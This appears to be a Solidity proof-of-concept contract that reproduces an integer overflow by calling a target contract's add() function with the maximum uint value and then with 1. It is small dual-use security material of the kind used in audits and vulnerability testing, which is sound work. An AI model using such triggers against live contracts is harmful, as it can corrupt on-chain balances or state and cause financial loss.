
interface IOverflow {
    function add(uint value) external returns (bool);
}

contract Reproduction {
    IOverflow overflowContract;

    constructor(address _overflowAddress) {
        overflowContract = IOverflow(_overflowAddress);
    }

    function triggerOverflow() public {
        uint maxValue = type(uint).max;
        overflowContract.add(maxValue);
        overflowContract.add(1);
    }
}

